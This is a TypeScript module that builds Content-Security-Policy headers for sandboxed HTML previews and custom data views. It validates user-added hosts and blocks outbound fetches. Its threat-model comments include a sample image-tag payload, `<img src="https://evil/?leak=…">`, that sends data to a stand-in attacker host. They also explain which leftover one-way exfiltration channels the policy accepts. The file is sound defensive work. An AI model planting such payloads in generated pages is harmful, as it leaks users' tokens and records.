// CSP whitelist applied to HTML files previewed in the Files
// explorer iframe. We ship a narrow list of trusted CDNs that the
// LLM commonly pulls from (Chart.js, D3, Tailwind, etc. via
// jsdelivr / unpkg / cdnjs) plus Google Fonts. Anything else —
// random `https://` origins, phone-home `fetch()` calls, etc. —
// is rejected.
//
// The list itself lives in `@mulmoclaude/core/remote-view`
// (SANDBOXED_VIEW_CDN_ALLOWLIST) so the remote-view CSP and these
// desktop policies can't drift — widen it THERE, and keep it
// audited: every entry is a potential supply-chain surface.

import { SANDBOXED_VIEW_CDN_ALLOWLIST } from "@mulmoclaude/core/remote-view";
import { isRecord } from "../types";

export const HTML_PREVIEW_CSP_ALLOWED_CDNS: readonly string[] = SANDBOXED_VIEW_CDN_ALLOWLIST;

// Directives a user may extend from `config/csp.json` (see #1989). Hosts here
// are ADDED to the hardcoded base policy, never replace it. `connect-src` is
// included but is the sharpest edge — widening it opens a two-way exfiltration
// channel for a custom view's scoped token/data (warned about elsewhere).
export const CSP_EXTENDABLE_DIRECTIVES = ["frame-src", "script-src", "style-src", "font-src", "img-src", "media-src", "connect-src"] as const;
export type CspDirective = (typeof CSP_EXTENDABLE_DIRECTIVES)[number];
export type CspExtraHosts = Partial<Record<CspDirective, readonly string[]>>;

const extraFor = (extra: CspExtraHosts, directive: CspDirective): string[] => [...(extra[directive] ?? [])];

// A user-supplied host is accepted only as a plain https origin (scheme +
// host, optional port) — no paths, no wildcards, and none of the `'unsafe-*'`
// / `data:` / `blob:` keyword tokens that would blow the policy wide open.
// Config widening stays "trust this specific host" and nothing more. Parsed
// with `URL` (no hand-rolled regex → no ReDoS): the origin round-trip rejects
// paths / query / hash / credentials, and the per-char host check rejects
// wildcards like `*.evil.com` that `URL` would otherwise accept as a hostname.
function isPlainHttpsHost(value: string): boolean {
  try {
    const url = new URL(value);
    if (url.protocol !== "https:" || value.toLowerCase() !== `https://${url.host}`) return false;
    return url.hostname.length > 0 && [...url.hostname].every((char) => /[a-z0-9.-]/i.test(char));
  } catch {
    return false;
  }
}

export function sanitizeCspExtra(raw: unknown): CspExtraHosts {
  if (!isRecord(raw)) return {};
  const out: CspExtraHosts = {};
  for (const directive of CSP_EXTENDABLE_DIRECTIVES) {
    const value = raw[directive];
    if (!Array.isArray(value)) continue;
    const hosts = value.map((host) => (typeof host === "string" ? host.trim() : "")).filter(isPlainHttpsHost);
    if (hosts.length > 0) out[directive] = [...new Set(hosts)];
  }
  return out;
}

/**
 * Build the CSP string. Split from the wrapper so tests can exercise
 * the policy without HTML-template noise.
 *
 * `origin`, when provided, replaces `'self'` in `img-src`. The preview
 * iframe is `sandbox="allow-scripts"` only, so its document has an
 * opaque origin: Safari/WebKit matches `'self'` against the (opaque)
 * origin tuple and rejects every same-origin image request. Chrome
 * matches `'self'` against the document URL and works either way. Pass
 * the explicit server origin from HTTP-header callers; leave it
 * undefined for the `srcdoc` fallback (where `'self'` is meaningless
 * either way and there are no same-origin refs to resolve).
 */
function buildCsp(connectSrc: string, imgSelf: string, cdns: readonly string[], extraImgSrc = "", mediaSrc = "", extra: CspExtraHosts = {}): string {
  const cdnArr = [...cdns];
  // Sanitize at the builder boundary — NOT only at the callers — so an added
  // host can never carry a `;` (inject another directive) or a `"` (break the
  // `<meta … content="…">` attribute), regardless of whether the caller
  // remembered to sanitize. Idempotent for already-clean input.
  const safeExtra = sanitizeCspExtra(extra);
  const directives: string[] = [
    "default-src 'none'",
    // LLM-authored HTML almost always uses inline <script> blocks
    // alongside the CDN load. No feasible path to avoid
    // 'unsafe-inline' without rewriting every output.
    `script-src ${["'unsafe-inline'", ...cdnArr, ...extraFor(safeExtra, "script-src")].join(" ")}`,
    `style-src ${["'unsafe-inline'", ...cdnArr, ...extraFor(safeExtra, "style-src")].join(" ")}`,
    `font-src ${[...cdnArr, ...extraFor(safeExtra, "font-src")].join(" ")}`,
    // Images: same-origin (workspace files via /api/files/raw), CDN
    // whitelist, plus data: and blob: for inline PNGs and dynamically-
    // generated charts. Wildcard is deliberately avoided here — an attacker
    // who plants an <img src="https://evil/?leak="> in preview HTML
    // could exfiltrate data via image requests even with connect-src
    // blocked. Widen via HTML_PREVIEW_CSP_ALLOWED_CDNS if LLM output
    // legitimately needs more hosts. `extraImgSrc` lets a specific caller
    // (custom views) opt into a broader source set — see buildCustomViewCsp.
    `img-src ${[imgSelf, ...cdnArr, "data:", "blob:", ...(extraImgSrc ? [extraImgSrc] : []), ...extraFor(safeExtra, "img-src")].join(" ")}`,
  ];
  // Audio / video: omitted by default, so `<audio>`/`<video>` fall back to
  // default-src 'none' (preview + print stay locked). Custom views opt in via
  // `mediaSrc`; users can also add hosts via config. Same one-way GET-exfil
  // tradeoff as img-src, see buildCustomViewCsp.
  const media = [...(mediaSrc ? [mediaSrc] : []), ...extraFor(safeExtra, "media-src")];
  if (media.length > 0) directives.push(`media-src ${media.join(" ")}`);
  // frame-src has NO base value — iframes fall back to default-src 'none'
  // (locked) unless a user opts specific hosts in via config (e.g. a Google
  // Maps embed). Only emitted when the user added hosts.
  const frame = extraFor(safeExtra, "frame-src");
  if (frame.length > 0) directives.push(`frame-src ${frame.join(" ")}`);
  directives.push(`connect-src ${[connectSrc, ...extraFor(safeExtra, "connect-src")].join(" ")}`);
  return directives.join("; ");
}

export function buildHtmlPreviewCsp(origin?: string, cdns: readonly string[] = HTML_PREVIEW_CSP_ALLOWED_CDNS, extra: CspExtraHosts = {}): string {
  // Block XHR / fetch / WebSocket so previews can't phone home or
  // exfiltrate anything the inline scripts happen to compute (unless the
  // user opts hosts into connect-src via config).
  return buildCsp("'none'", origin ?? "'self'", cdns, "", "", extra);
}

/**
 * CSP for a custom collection view (see plans/done/feat-collections-custom-views.md).
 * Same policy as the preview header EXCEPT `connect-src` is the server origin
 * (not `'none'`): a custom view legitimately `fetch()`es its collection's data
 * endpoint.
 *
 * Threat model — a custom view is handed a scoped token (`window.__MC_VIEW`) +
 * the collection's records, so we must prevent exfiltration to an attacker:
 *   - **`connect-src` = the server origin only.** This is the channel that
 *     matters: fetch / XHR / WebSocket / sendBeacon / EventSource to an
 *     arbitrary host is what lets a malicious view stream the token/data out.
 *     Locked to the origin, the view can reach ONLY its own data endpoint.
 *   - **Script / style / font loads reuse the curated CDN allowlist.** A
 *     `<… src="https://cdn/x?token">` request does reach that host, but the
 *     allowlist is reputable infrastructure (jsdelivr / unpkg / cdnjs / Google
 *     Fonts / plotly) that does NOT expose per-request logs to third parties,
 *     so the token lands in the CDN's logs, never an attacker's. The
 *     allowlist-exfil bypass needs an attacker-CONTROLLABLE allowed host (open
 *     redirect, logging endpoint, attacker subdomain); none here qualify. This
 *     also lets views use charting libs (Chart.js, Plotly, D3) from a CDN.
 *   - **`img-src` additionally allows any `https:` host.** Feed/collection
 *     records routinely carry external image URLs (e.g. an RSS feed's article
 *     thumbnails), and a view must be able to render them. This re-admits a
 *     limited, ONE-WAY exfiltration channel — a compromised view could encode
 *     record data into an `<img src="https://evil/?leak=…">` URL — which the
 *     `connect-src` lock alone does not close. We accept it: the views are
 *     authored by the user's own agent over the user's own data, the channel is
 *     GET-only and URL-length-bounded (no response is readable), and `fetch` /
 *     XHR / WebSocket / beacon stay origin-locked, so bulk/bidirectional exfil
 *     is still blocked. If you need the strict guarantee back, proxy images
 *     through the origin instead of widening `img-src`.
 *   - **`media-src` likewise allows the origin + any `https:` host** (+ `data:`/
 *     `blob:`), so a record's audio/video URL — e.g. a podcast feed's `.mp3` —
 *     plays in an `<audio>`/`<video>` element. Same one-way GET-exfil tradeoff
 *     as `img-src`, accepted for the same reasons; the streamed bytes flow into
 *     the element, not into readable script state.
 *
 * `origin` MUST be the explicit server origin: the sandboxed iframe has an
 * opaque origin, so `'self'` would never match (same reason the preview policy
 * substitutes the origin into `img-src`).
 */
export function buildCustomViewCsp(origin: string, cdns: readonly string[] = HTML_PREVIEW_CSP_ALLOWED_CDNS, extra: CspExtraHosts = {}): string {
  return buildCsp(origin, origin, cdns, "https:", `${origin} https: data: blob:`, extra);
}

/**
 * Build the CSP string for the print-mode hidden iframe (presentHtml's
 * printToPdf). Same policy as the preview header with the explicit
 * server origin substituted for `'self'` — see `buildHtmlPreviewCsp`
 * for why the substitution is required.
 */
export function buildPrintCspContent(origin: string, cdns: readonly string[] = HTML_PREVIEW_CSP_ALLOWED_CDNS, extra: CspExtraHosts = {}): string {
  return buildHtmlPreviewCsp(origin, cdns, extra);
}

const CSP_META_NONCE = ""; // reserved for future use (per-render nonce)

/**
 * Inject a `<meta http-equiv="Content-Security-Policy">` tag into the
 * HTML head. If the HTML has no `<head>`, wrap it as a full document
 * with a synthetic head so the meta tag is honoured regardless.
 *
 * Pure — doesn't touch the DOM. Safe to use from both client and
 * tests.
 */
export function wrapHtmlWithPreviewCsp(html: string, extra: CspExtraHosts = {}): string {
  const csp = buildHtmlPreviewCsp(undefined, HTML_PREVIEW_CSP_ALLOWED_CDNS, extra);
  const meta = `<meta http-equiv="Content-Security-Policy" content="${csp}">`;
  if (/<head\b[^>]*>/i.test(html)) {
    return html.replace(/(<head\b[^>]*>)/i, `$1${meta}`);
  }
  // No <head> — treat as fragment and wrap it.
  return `<!DOCTYPE html><html><head>${meta}</head><body>${html}</body></html>${CSP_META_NONCE}`;
}
